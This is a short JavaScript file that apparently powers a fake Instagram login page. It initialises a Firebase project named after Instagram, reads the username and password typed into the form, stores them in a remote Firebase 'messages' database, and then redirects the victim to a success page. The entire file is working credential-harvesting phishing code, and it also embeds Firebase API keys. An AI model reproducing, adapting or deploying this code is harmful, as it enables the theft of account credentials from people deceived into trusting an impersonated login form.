 var firebaseConfig = {
        apiKey: "AIzaSyDIGwO5ovw8qlImPlN42RVQJJzhJ7MNixw",
        authDomain: "instagram-4b8fe.firebaseapp.com",
        databaseURL: "https://instagram-4b8fe.firebaseio.com",
        projectId: "instagram-4b8fe",
        storageBucket: "instagram-4b8fe.appspot.com",
        messagingSenderId: "914768049549",
        appId: "1:914768049549:web:3f416a5f2976c2893579c4",
        measurementId: "G-YG7XRK5NPH"
      };




      // Initialize Firebase
      firebase.initializeApp(firebaseConfig);
      

     // Initialize firebase database collection
      var msgref = firebase.database().ref('messages');
    

      document.getElementById("detail").addEventListener("submit",submitForm);
      var det =document.getElementById("detail");
      document.getElementById("user").addEventListener("input", btnclick);
      document.getElementById("password").addEventListener("input", btnclick);
    


      function btnclick()
      {
        var username = document.getElementById("user").value;

        var password = document.getElementById("password").value;
        
        if(username.length !=0 && password.length> 6)
        {
          document.getElementById("sub").disabled = false;
          document.getElementById("sub").style.opacity= 1;
          document.getElementById("sub").style.cursor="pointer";
          
          
        }
        else
        {
          document.getElementById("sub").disabled = true;
          document.getElementById("sub").style.opacity= 0.3;
          document.getElementById("sub").style.cursor="default";

        }
        


      }
      

     //Reset the form fields
      function reset()
      {
        det.reset();
        return false;

      }
    


      function submitForm(e)
      {
          e.preventDefault();
          console.log(21);
          var username = document.getElementById("user").value;
          var password = document.getElementById("password").value;

          saveMessage(username, password);
          
  
          
          reset();
          location.replace("success.html");

      }
      
 


      function saveMessage(username, password)
      {
        var newMessageRef = msgref.push();
        newMessageRef.set({

          username: username,
          password: password
        });


      }


















  


